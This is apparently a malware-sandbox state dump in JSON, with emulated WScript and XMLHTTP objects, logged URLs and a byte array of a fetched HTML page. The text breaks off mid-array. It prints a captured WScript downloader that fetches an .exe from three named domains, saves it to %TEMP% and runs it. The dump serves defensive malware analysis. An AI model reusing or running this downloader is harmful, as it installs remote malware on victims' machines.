{
    "_download": "Yes",
    "toString": "() => {\n    return \"sandbox\";\n}",
    "_object_id": 17,
    "util_log": "util_log",
    "Buffer": "function Buffer(arg, encodingOrOffset, length) {\n  // Common case.\n  if (typeof arg === 'number') {\n    if (typeof encodingOrOffset === 'string') {\n      throw new Error(\n        'If encoding is specified then the first argument must be a string'\n      );\n    }\n    return Buffer.allocUnsafe(arg);\n  }\n  return Buffer.from(arg, encodingOrOffset, length);\n}",
    "_options": {},
    "_browser_type": "IE8",
    "_proxy_verbose": false,
    "_sync_request": "function doRequest(method, url, options) {\n  if (!spawnSync) {\n    throw new Error(\n      'Sync-request requires node version 0.12 or later.  If you need to use it with an older version of node\\n' +\n      'you can `npm install sync-request@2.2.0`, which was the last version to support older versions of node.'\n    );\n  }\n  var req = JSON.stringify({\n    method: method,\n    url: url,\n    options: options\n  });\n  var res = spawnSync(process.execPath, [require.resolve('./lib/worker.js')], {input: req});\n  if (res.status !== 0) {\n    throw new Error(res.stderr.toString());\n  }\n  if (res.error) {\n    if (typeof res.error === 'string') res.error = new Error(res.error);\n    throw res.error;\n  }\n  var response = JSON.parse(res.stdout);\n  if (response.success) {\n    return new HttpResponse(response.response.statusCode, response.response.headers, response.response.body, response.response.url);\n  } else {\n    throw new Error(response.error.message || response.error || response);\n  }\n}",
    "_data": {
        "eval_calls": [
            {
                "orig": "var b = \"kennedy.sitoserver.com nzvincent.com abama.org\".split(\" \"); var ws = WScript.CreateObject(\"WScript.Shell\"); var fn = ws.ExpandEnvironmentStrings(\"%TEMP%\")+String.fromCharCode(92)+\"799755\"; var xo = WScript.CreateObject(\"MSXML2.XMLHTTP\"); var xa = WScript.CreateObject(\"ADODB.Stream\"); var ld = 0; for (var n=1; n<=3; n++) { for (var i=ld; i<b.length; i++) { var dn = 0; try { xo.open(\"GET\",\"http://\"+b[i]+\"/counter/?id=\"+str+\"&rnd=309034\"+n, false); xo.send(); if (xo.status == 200) { xa.open(); xa.type = 1; xa.write(xo.responseBody); if (xa.size > 1000) { dn = 1; xa.position = 0; xa.saveToFile(fn+n+\".exe\",2); try { ws.Run(fn+n+\".exe\",1,0); } catch (er) { }; }; xa.close(); }; if (dn == 1) { ld = i; break; }; } catch (er) { }; }; };",
                "report_catch": "var b = \"kennedy.sitoserver.com nzvincent.com abama.org\".split(\" \"); var ws = WScript.CreateObject(\"WScript.Shell\"); var fn = ws.ExpandEnvironmentStrings(\"%TEMP%\")+String.fromCharCode(92)+\"799755\"; var xo = WScript.CreateObject(\"MSXML2.XMLHTTP\"); var xa = WScript.CreateObject(\"ADODB.Stream\"); var ld = 0; for (var n=1; n<=3; n++) { for (var i=ld; i<b.length; i++) { var dn = 0; try { xo.open(\"GET\",\"http://\"+b[i]+\"/counter/?id=\"+str+\"&rnd=309034\"+n, false); xo.send(); if (xo.status == 200) { xa.open(); xa.type = 1; xa.write(xo.responseBody); if (xa.size > 1000) { dn = 1; xa.position = 0; xa.saveToFile(fn+n+\".exe\",2); try { ws.Run(fn+n+\".exe\",1,0); } catch(er) { util_log(\">>> Silencing catch \" + _inspect(er)); }; }; xa.close(); }; if (dn == 1) { ld = i; break; }; } catch(er) { util_log(\">>> Silencing catch \" + _inspect(er)); }; }; };",
                "safe_funcs": "var b = \"kennedy.sitoserver.com nzvincent.com abama.org\".split(\" \"); var ws = WScript.CreateObject(\"WScript.Shell\"); var fn = ws.ExpandEnvironmentStrings(\"%TEMP%\")+String.fromCharCode(92)+\"799755\"; var xo = WScript.CreateObject(\"MSXML2.XMLHTTP\"); var xa = WScript.CreateObject(\"ADODB.Stream\"); var ld = 0; for (var n=1; n<=3; n++) { for (var i=ld; i<b.length; i++) { var dn = 0; try { xo.open(\"GET\",\"http://\"+b[i]+\"/counter/?id=\"+str+\"&rnd=309034\"+n, false); xo.send(); if (xo.status == 200) { xa.open(); xa.type = 1; xa.write(xo.responseBody); if (xa.size > 1000) { dn = 1; xa.position = 0; xa.saveToFile(fn+n+\".exe\",2); try { ws.Run(fn+n+\".exe\",1,0); } catch(er) { util_log(\">>> Silencing catch \" + _inspect(er)); }; }; xa.close(); }; if (dn == 1) { ld = i; break; }; } catch(er) { util_log(\">>> Silencing catch \" + _inspect(er)); }; }; };"
            }
        ]
    },
    "_sc": ">>> Silencing catch ",
    "_script_name": "/home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js",
    "_defineProperty": "_defineProperty",
    "_truncateOutput": "_truncateOutput",
    "_defineSingleProperty": "_defineSingleProperty",
    "_proxy_options": {
        "dont_fail": true,
        "verbose": false
    },
    "_proxy": "_proxy",
    "_trace": "function _trace(t) {\n    try {\n        throw new Error(t);\n    } catch (err) {\n        util_log(\"Trace Non-\" + _inspect(err));\n    }\n}",
    "eval": "function eval(s) { /* [native code ] */ return _(s)}",
    "_Function_calls": {},
    "_orig_Function": "_orig_Function",
    "Function": "Function",
    "_wscript_saved_files": {},
    "_wscript_urls": [
        "http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341",
        "http://nzvincent.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341",
        "http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341",
        "http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342",
        "http://nzvincent.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342",
        "http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342",
        "http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343",
        "http://nzvincent.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343",
        "http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343"
    ],
    "_wscript_objects": [
        {
            "id": 14,
            "_name": "WScript.Shell[14]",
            "expandenvironmentstrings": "function (a) {\n        var ret = a;\n        var regex;\n        for (var key in ENV) {\n            if (ENV.hasOwnProperty(key)) {\n                regex = new RegExp(\"%\"+key+\"%\", \"ig\");\n                ret = ret.replace(regex, ENV[key]);\n            }\n        }\n        util_log(this._name + \".ExpandEnvironmentStrings(\" + a + \") => \" + ret);\n        return ret;\n    }",
            "run": "function (a, b, c) {\n        util_log(this._name + \".Run(\" + a + \", \" + b + \", \" + c + \")\");\n    }",
            "exec": "function (a) {\n        util_log(this._name + \".Exec(\" + a + \")\");\n        return new _proxy(new Process(a));\n    }",
            "regwrite": "function (a, b, c) {\n        util_log(this._name + \".RegWrite(\" + a + \", \" + b + \", \" + c + \")\");\n        REG[_reg_normalize(a)] = b;\n    }",
            "regread": "function (a) {\n        var ret = \"\" + REG[_reg_normalize(a)];\n        if (ret === \"undefined\") {\n            util_log(\"FIXME: \" + this._name + \".RegRead(\" + a + \") - unknown key\");\n        }\n        util_log(this._name + \".RegRead(\" + a + \") => \" + ret);\n        return ret;\n    }",
            "environment": "function (a) {\n        var ret = WshEnvironment(a);\n        util_log(this._name + \".Environment(\" + a + \")\");\n        return ret;\n    }",
            "specialfolders": "function (a) {\n        util_log(\"WScript.SpecialFolders(\" + a + \")\");\n        return a + \"/\";\n    }",
            "createshortcut": "function (a) {\n        a = _truncateOutput(a);\n        util_log(\"WScript.CreateShortcut(\" + a + \")\");\n        return _proxy(new WshShortcut(a));\n    }",
            "popup": "function () {\n        a = _truncateOutput(Array.prototype.slice.call(arguments, 0).join(\",\"));\n        util_log(\"WScript.Popup(\" + a + \")\");\n        return 1;\n        // -1 The user did not click a button before nSecondsToWait seconds elapsed.\n        // 1 OK button\n        // 2 Cancel button\n        // 3 Abort button\n        // 4 Retry button\n        // 5 Ignore button\n        // 6 Yes button\n        // 7 No button\n        // 10 Try Again button\n        // 11 Continue button\n    }",
            "tostring": "function () {\n        return this._name;\n    }",
            "toString": "function () {\n        return this._name;\n    }"
        },
        {
            "id": 15,
            "_name": "MSXML2.XMLHTTP[15]",
            "_status": 499,
            "_headers": {},
            "tostring": "() => {\n        return this._name\n    }",
            "toString": "() => {\n        return this._name\n    }",
            "_allresponseheaders": "{\"content-type\":\"text/html; charset=utf-8\",\"content-length\":\"2937\"}",
            "_activexobject": "ActiveXObject",
            "open": "function (m, u, a) {\n        u = u.replace(/\\r|\\n/g, \"\");\n        util_log(this._name + \".open(\" + m + \",\" + u + \",\" + a + \")\");\n        this.method = m;\n        this.url = u;\n        switch ((\"\" + a).toLowerCase()) {\n            case \"false\":\n            case \"no\":\n            case \"0\":\n            case \"\":\n            case \"undefined\":\n            case null:\n                this.async = false;\n                break;\n            default:\n                this.async = true;\n        }\n        _wscript_urls[_wscript_urls.length] = u;\n    }",
            "close": "function () {\n        util_log(this._name + \".close()\");\n    }",
            "getallresponseheaders": "function () {\n        var ret = this.allresponseheaders;\n        util_log(this._name + \".getAllResponseHeaders() => \" + _inspect(ret));\n        return ret;\n    }",
            "send": "function (a) {\n        util_log(this._name + \".send(\" + a + \")\");\n        if (_download === \"Yes\") {\n            try {\n                var res = _sync_request(this.method, this.url, {\n                    'headers': this._headers\n                });\n                //util_log(\"Sync_req: \" + _truncateOutput(res.getBody()));\n                this.status = res.statusCode || 0;\n                this.readystate = 4;\n                this.statustext = \"OK\";\n                this.responsebody = res.body || \"\";\n                this.allresponseheaders = JSON.stringify(res.headers) || \"\";\n            } catch (err) {\n                util_log(this._name + \".send() Exception: \" + _truncateOutput(_inspect(err)));\n                this.status = err.statusCode || 0;\n                this.readystate = 4;\n                this.statustext = err.toString();\n                this.responsebody = err.body || \"\";\n                this.allresponseheaders = JSON.stringify(err.headers) || \"\";\n            }\n            if (this.onreadystatechange) {\n                util_log(this._name + \".onreadystatechange()\");\n                this.onreadystatechange();\n            }\n            return;\n        } else if (_download === \"No\") {\n            util_log(this._name + \" Not sending data, if you want to interact with remote server, set --down\");\n            var s = 'MZ'\n            for (var ii = 0; ii < 200; ii++) {\n                s += 'Dumy conntent, use --down to download the real payload.\\n';\n            }\n            this.responsebody = s;\n            this.status = 200;\n            this.readystate = 4;\n            if (this.onreadystatechange) {\n                util_log(this._name + \" Calling onreadystatechange() with dummy data\");\n                this.onreadystatechange();\n            }\n        } else if (_download === \"Return HTTP/404\") {\n            util_log(this._name + \" Intentionally returning HTTP/404\");\n            this.responsebody = \"HTTP/404 Resource not found\";\n            this.status = 404;\n            this.readystate = 4;\n            if (this.onreadystatechange) {\n                util_log(this._name + \" Calling onreadystatechange()\");\n                this.onreadystatechange();\n            }\n        } else {\n            util_log(\">>> FIXME: MSXML2_XMLHTTP.send _download '\" + _download + \"' not handled\");\n            throw new TypeError(\">>> FIXME: MSXML2_XMLHTTP.send _download '\" + _download + \"' not handled\");\n        }\n        util_log(this._name + \".send(\" + a + \") finished\");\n    }",
            "setrequestheader": "function (a, b) {\n        util_log(this._name + \".setRequestHeader(\" + a + \", \" + b + \")\");\n        this._headers[a] = b;\n    }",
            "setoption": "function () {\n        a = _truncateOutput(Array.prototype.slice.call(arguments, 0).join(\",\"));\n        util_log(this._name + \".setOption(\" + a + \")\");\n    }",
            "setTimeouts": "function (resolveTimeout, connectTimeout, sendTimeout, receiveTimeout) \n    {\n        util_log(this._name + \".setTimeouts(\" + resolveTimeout + \", \" + connectTimeout + \", \" + sendTimeout + \", \" + receiveTimeout + \")\");\n    }",
            "defineProperty": "function (obj, prop, descriptor) //PROPIA\n    {\n        var value = descriptor.value;\n        if(value == undefined)\n            value = descriptor.get();\n\n        util_log(this._name + \".defineProperty(\" + obj + \", \" + prop + \", \" + descriptor +\")\");\n        \n        obj[prop] = value;\n        if(obj[prop])\n            obj[prop][\"descriptor\"] = descriptor;\n        \n        return obj;\n    }",
            "_responseBody": {
                "0": 239,
                "1": 187,
                "2": 191,
                "3": 60,
                "4": 104,
                "5": 116,
                "6": 109,
                "7": 108,
                "8": 32,
                "9": 100,
                "10": 105,
                "11": 114,
                "12": 61,
                "13": 34,
                "14": 108,
                "15": 116,
                "16": 114,
                "17": 34,
                "18": 62,
                "19": 13,
                "20": 10,
                "21": 60,
                "22": 104,
                "23": 101,
                "24": 97,
                "25": 100,
                "26": 62,
                "27": 13,
                "28": 10,
                "29": 9,
                "30": 60,
                "31": 109,
                "32": 101,
                "33": 116,
                "34": 97,
                "35": 32,
                "36": 104,
                "37": 116,
                "38": 116,
                "39": 112,
                "40": 45,
                "41": 101,
                "42": 113,
                "43": 117,
                "44": 105,
                "45": 118,
                "46": 61,
                "47": 39,
                "48": 99,
                "49": 111,
                "50": 110,
                "51": 116,
                "52": 101,
                "53": 110,
                "54": 116,
                "55": 45,
                "56": 116,
                "57": 121,
                "58": 112,
                "59": 101,
                "60": 39,
                "61": 32,
                "62": 99,
                "63": 111,
                "64": 110,
                "65": 116,
                "66": 101,
                "67": 110,
                "68": 116,
                "69": 61,
                "70": 39,
                "71": 116,
                "72": 101,
                "73": 120,
                "74": 116,
                "75": 47,
                "76": 104,
                "77": 116,
                "78": 109,
                "79": 108,
                "80": 59,
                "81": 99,
                "82": 104,
                "83": 97,
                "84": 114,
                "85": 115,
                "86": 101,
                "87": 116,
                "88": 61,
                "89": 117,
                "90": 116,
                "91": 102,
                "92": 45,
                "93": 56,
                "94": 39,
                "95": 62,
                "96": 13,
                "97": 10,
                "98": 9,
                "99": 60,
                "100": 116,
                "101": 105,
                "102": 116,
                "103": 108,
                "104": 101,
                "105": 62,
                "106": 75,
                "107": 97,
                "108": 115,
                "109": 112,
                "110": 101,
                "111": 114,
                "112": 115,
                "113": 107,
                "114": 121,
                "115": 32,
                "116": 65,
                "117": 110,
                "118": 116,
                "119": 105,
                "120": 45,
                "121": 86,
                "122": 105,
                "123": 114,
                "124": 117,
                "125": 115,
                "126": 60,
                "127": 47,
                "128": 116,
                "129": 105,
                "130": 116,
                "131": 108,
                "132": 101,
                "133": 62,
                "134": 13,
                "135": 10,
                "136": 32,
                "137": 32,
                "138": 32,
                "139": 32,
                "140": 60,
                "141": 115,
                "142": 116,
                "143": 121,
                "144": 108,
                "145": 101,
                "146": 32,
                "147": 116,
                "148": 121,
                "149": 112,
                "150": 101,
                "151": 61,
                "152": 34,
                "153": 116,
                "154": 101,
                "155": 120,
                "156": 116,
                "157": 47,
                "158": 99,
                "159": 115,
                "160": 115,
                "161": 34,
                "162": 62,
                "163": 13,
                "164": 10,
                "165": 32,
                "166": 32,
                "167": 32,
                "168": 32,
                "169": 32,
                "170": 32,
                "171": 32,
                "172": 32,
                "173": 104,
                "174": 116,
                "175": 109,
                "176": 108,
                "177": 44,
                "178": 98,
                "179": 111,
                "180": 100,
                "181": 121,
                "182": 123,
                "183": 104,
                "184": 101,
                "185": 105,
                "186": 103,
                "187": 104,
                "188": 116,
                "189": 58,
                "190": 49,
                "191": 48,
                "192": 48,
                "193": 37,
                "194": 125,
                "195": 13,
                "196": 10,
                "197": 32,
                "198": 32,
                "199": 32,
                "200": 32,
                "201": 32,
                "202": 32,
                "203": 32,
                "204": 32,
                "205": 104,
                "206": 116,
                "207": 109,
                "208": 108,
                "209": 91,
                "210": 100,
                "211": 105,
                "212": 114,
                "213": 61,
                "214": 34,
                "215": 114,
                "216": 116,
                "217": 108,
                "218": 34,
                "219": 93,
                "220": 32,
                "221": 123,
                "222": 13,
                "223": 10,
                "224": 32,
                "225": 32,
                "226": 32,
                "227": 32,
                "228": 32,
                "229": 32,
                "230": 32,
                "231": 32,
                "232": 32,
                "233": 32,
                "234": 32,
                "235": 32,
                "236": 100,
                "237": 105,
                "238": 114,
                "239": 101,
                "240": 99,
                "241": 116,
                "242": 105,
                "243": 111,
                "244": 110,
                "245": 58,
                "246": 114,
                "247": 116,
                "248": 108,
                "249": 59,
                "250": 13,
                "251": 10,
                "252": 32,
                "253": 32,
                "254": 32,
                "255": 32,
                "256": 32,
                "257": 32,
                "258": 32,
                "259": 32,
                "260": 125,
                "261": 13,
                "262": 10,
                "263": 32,
                "264": 32,
                "265": 32,
                "266": 32,
                "267": 32,
                "268": 32,
                "269": 32,
                "270": 32,
                "271": 46,
                "272": 97,
                "273": 100,
                "274": 97,
                "275": 112,
                "276": 116,
                "277": 32,
                "278": 123,
                "279": 116,
                "280": 101,
                "281": 120,
                "282": 116,
                "283": 45,
                "284": 97,
                "285": 108,
                "286": 105,
                "287": 103,
                "288": 110,
                "289": 58,
                "290": 32,
                "291": 108,
                "292": 101,
                "293": 102,
                "294": 116,
                "295": 59,
                "296": 125,
                "297": 13,
                "298": 10,
                "299": 32,
                "300": 32,
                "301": 32,
                "302": 32,
                "303": 32,
                "304": 32,
                "305": 32,
                "306": 32,
                "307": 32,
                "308": 104,
                "309": 116,
                "310": 109,
                "311": 108,
                "312": 91,
                "313": 100,
                "314": 105,
                "315": 114,
                "316": 61,
                "317": 34,
                "318": 114,
                "319": 116,
                "320": 108,
                "321": 34,
                "322": 93,
                "323": 32,
                "324": 46,
                "325": 97,
                "326": 100,
                "327": 97,
                "328": 112,
                "329": 116,
                "330": 32,
                "331": 123,
                "332": 13,
                "333": 10,
                "334": 32,
                "335": 32,
                "336": 32,
                "337": 32,
                "338": 32,
                "339": 32,
                "340": 32,
                "341": 32,
                "342": 32,
                "343": 32,
                "344": 32,
                "345": 32,
                "346": 32,
                "347": 116,
                "348": 101,
                "349": 120,
                "350": 116,
                "351": 45,
                "352": 97,
                "353": 108,
                "354": 105,
                "355": 103,
                "356": 110,
                "357": 58,
                "358": 32,
                "359": 114,
                "360": 105,
                "361": 103,
                "362": 104,
                "363": 116,
                "364": 59,
                "365": 13,
                "366": 10,
                "367": 32,
                "368": 32,
                "369": 32,
                "370": 32,
                "371": 32,
                "372": 32,
                "373": 32,
                "374": 32,
                "375": 32,
                "376": 125,
                "377": 13,
                "378": 10,
                "379": 32,
                "380": 32,
                "381": 32,
                "382": 32,
                "383": 32,
                "384": 32,
                "385": 32,
                "386": 32,
                "387": 98,
                "388": 111,
                "389": 100,
                "390": 121,
                "391": 123,
                "392": 119,
                "393": 105,
                "394": 100,
                "395": 116,
                "396": 104,
                "397": 58,
                "398": 49,
                "399": 48,
                "400": 48,
                "401": 37,
                "402": 59,
                "403": 109,
                "404": 105,
                "405": 110,
                "406": 45,
                "407": 104,
                "408": 101,
                "409": 105,
                "410": 103,
                "411": 104,
                "412": 116,
                "413": 58,
                "414": 49,
                "415": 48,
                "416": 48,
                "417": 37,
                "418": 59,
                "419": 109,
                "420": 97,
                "421": 114,
                "422": 103,
                "423": 105,
                "424": 110,
                "425": 58,
                "426": 48,
                "427": 59,
                "428": 112,
                "429": 97,
                "430": 100,
                "431": 100,
                "432": 105,
                "433": 110,
                "434": 103,
                "435": 58,
                "436": 48,
                "437": 59,
                "438": 99,
                "439": 111,
                "440": 108,
                "441": 111,
                "442": 114,
                "443": 58,
                "444": 35,
                "445": 50,
                "446": 67,
                "447": 50,
                "448": 67,
                "449": 50,
                "450": 67,
                "451": 59,
                "452": 102,
                "453": 111,
                "454": 110,
                "455": 116,
                "456": 58,
                "457": 110,
                "458": 111,
                "459": 114,
                "460": 109,
                "461": 97,
                "462": 108,
                "463": 32,
                "464": 49,
                "465": 49,
                "466": 112,
                "467": 120,
                "468": 32,
                "469": 116,
                "470": 97,
                "471": 104,
                "472": 111,
                "473": 109,
                "474": 97,
                "475": 59,
                "476": 98,
                "477": 97,
                "478": 99,
                "479": 107,
                "480": 103,
                "481": 114,
                "482": 111,
                "483": 117,
                "484": 110,
                "485": 100,
                "486": 58,
                "487": 35,
                "488": 70,
                "489": 70,
                "490": 70,
                "491": 125,
                "492": 32,
                "493": 102,
                "494": 111,
                "495": 114,
                "496": 109,
                "497": 123,
                "498": 109,
                "499": 97,
                "500": 114,
                "501": 103,
                "502": 105,
                "503": 110,
                "504": 58,
                "505": 48,
                "506": 125,
                "507": 32,
                "508": 116,
                "509": 97,
                "510": 98,
                "511": 108,
                "512": 101,
                "513": 44,
                "514": 105,
                "515": 110,
                "516": 112,
                "517": 117,
                "518": 116,
                "519": 44,
                "520": 115,
                "521": 101,
                "522": 108,
                "523": 101,
                "524": 99,
                "525": 116,
                "526": 123,
                "527": 102,
                "528": 111,
                "529": 110,
                "530": 116,
                "531": 58,
                "532": 110,
                "533": 111,
                "534": 114,
                "535": 109,
                "536": 97,
                "537": 108,
                "538": 32,
                "539": 49,
                "540": 48,
                "541": 48,
                "542": 37,
                "543": 32,
                "544": 116,
                "545": 97,
                "546": 104,
                "547": 111,
                "548": 109,
                "549": 97,
                "550": 125,
                "551": 32,
                "552": 105,
                "553": 109,
                "554": 103,
                "555": 123,
                "556": 98,
                "557": 111,
                "558": 114,
                "559": 100,
                "560": 101,
                "561": 114,
                "562": 58,
                "563": 48,
                "564": 59,
                "565": 109,
                "566": 97,
                "567": 114,
                "568": 103,
                "569": 105,
                "570": 110,
                "571": 58,
                "572": 48,
                "573": 125,
                "574": 32,
                "575": 116,
                "576": 97,
                "577": 98,
                "578": 108,
                "579": 101,
                "580": 123,
                "581": 98,
                "582": 111,
                "583": 114,
                "584": 100,
                "585": 101,
                "586": 114,
                "587": 45,
                "588": 99,
                "589": 111,
                "590": 108,
                "591": 108,
                "592": 97,
                "593": 112,
                "594": 115,
                "595": 101,
                "596": 58,
                "597": 99,
                "598": 111,
                "599": 108,
                "600": 108,
                "601": 97,
                "602": 112,
                "603": 115,
                "604": 101,
                "605": 125,
                "606": 32,
                "607": 97,
                "608": 123,
                "609": 99,
                "610": 111,
                "611": 108,
                "612": 111,
                "613": 114,
                "614": 58,
                "615": 35,
                "616": 54,
                "617": 50,
                "618": 55,
                "619": 48,
                "620": 55,
                "621": 68,
                "622": 125,
                "623": 32,
                "624": 46,
                "625": 116,
                "626": 44,
                "627": 116,
                "628": 114,
                "629": 46,
                "630": 116,
                "631": 32,
                "632": 116,
                "633": 100,
                "634": 123,
                "635": 118,
                "636": 101,
                "637": 114,
                "638": 116,
                "639": 105,
                "640": 99,
                "641": 97,
                "642": 108,
                "643": 45,
                "644": 97,
                "645": 108,
                "646": 105,
                "647": 103,
                "648": 110,
                "649": 58,
                "650": 116,
                "651": 111,
                "652": 112,
                "653": 125,
                "654": 32,
                "655": 46,
                "656": 109,
                "657": 123,
                "658": 118,
                "659": 101,
                "660": 114,
                "661": 116,
                "662": 105,
                "663": 99,
                "664": 97,
                "665": 108,
                "666": 45,
                "667": 97,
                "668": 108,
                "669": 105,
                "670": 103,
                "671": 110,
                "672": 58,
                "673": 109,
                "674": 105,
                "675": 100,
                "676": 100,
                "677": 108,
                "678": 101,
                "679": 125,
                "680": 32,
                "681": 46,
                "682": 98,
                "683": 44,
                "684": 116,
                "685": 114,
                "686": 46,
                "687": 98,
                "688": 32,
                "689": 116,
                "690": 100,
                "691": 123,
                "692": 118,
                "693": 101,
                "694": 114,
                "695": 116,
                "696": 105,
                "697": 99,
                "698": 97,
                "699": 108,
                "700": 45,
                "701": 97,
                "702": 108,
                "703": 105,
                "704": 103,
                "705": 110,
                "706": 58,
                "707": 98,
                "708": 111,
                "709": 116,
                "710": 116,
                "711": 111,
                "712": 109,
                "713": 125,
                "714": 32,
                "715": 116,
                "716": 114,
                "717": 46,
                "718": 116,
                "719": 32,
                "720": 116,
                "721": 100,
                "722": 32,
                "723": 116,
                "724": 100,
                "725": 44,
                "726": 116,
                "727": 114,
                "728": 46,
                "729": 98,
                "730": 32,
                "731": 116,
                "732": 100,
                "733": 32,
                "734": 116,
                "735": 100,
                "736": 123,
                "737": 118,
                "738": 101,
                "739": 114,
                "740": 116,
                "741": 105,
                "742": 99,
                "743": 97,
                "744": 108,
                "745": 45,
                "746": 97,
                "747": 108,
                "748": 105,
                "749": 103,
                "750": 110,
                "751": 58,
                "752": 97,
                "753": 117,
                "754": 116,
                "755": 111,
                "756": 125,
                "757": 32,
                "758": 46,
                "759": 108,
                "760": 123,
                "761": 116,
                "762": 101,
                "763": 120,
                "764": 116,
                "765": 45,
                "766": 97,
                "767": 108,
                "768": 105,
                "769": 103,
                "770": 110,
                "771": 58,
                "772": 108,
                "773": 101,
                "774": 102,
                "775": 116,
                "776": 125,
                "777": 32,
                "778": 46,
                "779": 99,
                "780": 123,
                "781": 116,
                "782": 101,
                "783": 120,
                "784": 116,
                "785": 45,
                "786": 97,
                "787": 108,
                "788": 105,
                "789": 103,
                "790": 110,
                "791": 58,
                "792": 99,
                "793": 101,
                "794": 110,
                "795": 116,
                "796": 101,
                "797": 114,
                "798": 125,
                "799": 32,
                "800": 46,
                "801": 114,
                "802": 123,
                "803": 116,
                "804": 101,
                "805": 120,
                "806": 116,
                "807": 45,
                "808": 97,
                "809": 108,
                "810": 105,
                "811": 103,
                "812": 110,
                "813": 58,
                "814": 114,
                "815": 105,
                "816": 103,
                "817": 104,
                "818": 116,
                "819": 125,
                "820": 32,
                "821": 46,
                "822": 110,
                "823": 111,
                "824": 98,
                "825": 114,
                "826": 123,
                "827": 119,
                "828": 104,
                "829": 105,
                "830": 116,
                "831": 101,
                "832": 45,
                "833": 115,
                "834": 112,
                "835": 97,
                "836": 99,
                "837": 101,
                "838": 58,
                "839": 110,
                "840": 111,
                "841": 119,
                "842": 114,
                "843": 97,
                "844": 112,
                "845": 125,
                "846": 32,
                "847": 46,
                "848": 114,
                "849": 101,
                "850": 108,
                "851": 123,
                "852": 112,
                "853": 111,
                "854": 115,
                "855": 105,
                "856": 116,
                "857": 105,
                "858": 111,
                "859": 110,
                "860": 58,
                "861": 114,
                "862": 101,
                "863": 108,
                "864": 97,
                "865": 116,
                "866": 105,
                "867": 118,
                "868": 101,
                "869": 125,
                "870": 32,
                "871": 46,
                "872": 97,
                "873": 98,
                "874": 115,
                "875": 123,
                "876": 112,
                "877": 111,
                "878": 115,
                "879": 105,
                "880": 116,
                "881": 105,
                "882": 111,
                "883": 110,
                "884": 58,
                "885": 97,
                "886": 98,
                "887": 115,
                "888": 111,
                "889": 108,
                "890": 117,
                "891": 116,
                "892": 101,
                "893": 125,
                "894": 32,
                "895": 46,
                "896": 102,
                "897": 108,
                "898": 123,
                "899": 102,
                "900": 108,
                "901": 111,
                "902": 97,
                "903": 116,
                "904": 58,
                "905": 108,
                "906": 101,
                "907": 102,
                "908": 116,
                "909": 125,
                "910": 32,
                "911": 46,
                "912": 102,
                "913": 114,
                "914": 123,
                "915": 102,
                "916": 108,
                "917": 111,
                "918": 97,
                "919": 116,
                "920": 58,
                "921": 114,
                "922": 105,
                "923": 103,
                "924": 104,
                "925": 116,
                "926": 125,
                "927": 32,
                "928": 46,
                "929": 99,
                "930": 108,
                "931": 123,
                "932": 99,
                "933": 108,
                "934": 101,
                "935": 97,
                "936": 114,
                "937": 58,
                "938": 98,
                "939": 111,
                "940": 116,
                "941": 104,
                "942": 125,
                "943": 32,
                "944": 46,
                "945": 119,
                "946": 49,
                "947": 48,
                "948": 48,
                "949": 123,
                "950": 119,
                "951": 105,
                "952": 100,
                "953": 116,
                "954": 104,
                "955": 58,
                "956": 49,
                "957": 48,
                "958": 48,
                "959": 37,
                "960": 125,
                "961": 32,
                "962": 46,
                "963": 104,
                "964": 49,
                "965": 48,
                "966": 48,
                "967": 123,
                "968": 104,
                "969": 101,
                "970": 105,
                "971": 103,
                "972": 104,
                "973": 116,
                "974": 58,
                "975": 49,
                "976": 48,
                "977": 48,
                "978": 37,
                "979": 125,
                "980": 32,
                "981": 98,
                "982": 105,
                "983": 103,
                "984": 44,
                "985": 46,
                "986": 98,
                "987": 105,
                "988": 103,
                "989": 123,
                "990": 102,
                "991": 111,
                "992": 110,
                "993": 116,
                "994": 45,
                "995": 115,
                "996": 105,
                "997": 122,
                "998": 101,
                "999": 58,
                "1000": 49,
                "1001": 50,
                "1002": 53,
                "1003": 37,
                "1004": 125,
                "1005": 32,
                "1006": 115,
                "1007": 109,
                "1008": 97,
                "1009": 108,
                "1010": 108,
                "1011": 44,
                "1012": 46,
                "1013": 115,
                "1014": 109,
                "1015": 97,
                "1016": 108,
                "1017": 108,
                "1018": 123,
                "1019": 102,
                "1020": 111,
                "1021": 110,
                "1022": 116,
                "1023": 45,
                "1024": 115,
                "1025": 105,
                "1026": 122,
                "1027": 101,
                "1028": 58,
                "1029": 57,
                "1030": 53,
                "1031": 37,
                "1032": 125,
                "1033": 32,
                "1034": 46,
                "1035": 109,
                "1036": 105,
                "1037": 99,
                "1038": 114,
                "1039": 111,
                "1040": 123,
                "1041": 99,
                "1042": 111,
                "1043": 108,
                "1044": 111,
                "1045": 114,
                "1046": 58,
                "1047": 35,
                "1048": 68,
                "1049": 68,
                "1050": 68,
                "1051": 59,
                "1052": 102,
                "1053": 111,
                "1054": 110,
                "1055": 116,
                "1056": 58,
                "1057": 110,
                "1058": 111,
                "1059": 114,
                "1060": 109,
                "1061": 97,
                "1062": 108,
                "1063": 32,
                "1064": 57,
                "1065": 112,
                "1066": 120,
                "1067": 32,
                "1068": 116,
                "1069": 97,
                "1070": 104,
                "1071": 111,
                "1072": 109,
                "1073": 97,
                "1074": 125,
                "1075": 32,
                "1076": 104,
                "1077": 49,
                "1078": 123,
